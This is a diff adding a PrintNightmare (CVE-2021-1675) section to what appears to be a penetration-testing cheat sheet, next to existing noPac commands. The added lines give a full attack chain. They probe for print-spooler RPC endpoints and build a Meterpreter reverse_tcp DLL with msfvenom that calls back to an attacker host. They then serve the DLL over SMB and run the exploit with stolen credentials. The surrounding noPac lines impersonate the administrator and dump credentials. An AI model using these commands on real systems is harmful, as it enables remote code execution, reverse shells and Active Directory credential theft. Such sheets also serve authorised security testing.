@@ -848,6 +848,17 @@ $ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-h
 $ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-host <hostname> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator
 ```
 
+- PrintNightmare
+
+```
+https://github.com/cube0x0/CVE-2021-1675
+$ pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install
+$ rpcdump.py @<IP address> | egrep 'MS-RPRN|MS-PAR'
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<port> -f dll > backupscript.dll
+$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+$ sudo python3 CVE-2021-1675.py <domain>/<username>:<password>@<IP address> '\\<IP address>\CompData\backupscript.dll'
+```
+
 #4. - Lateral Movement
 -----------------------------------------
 
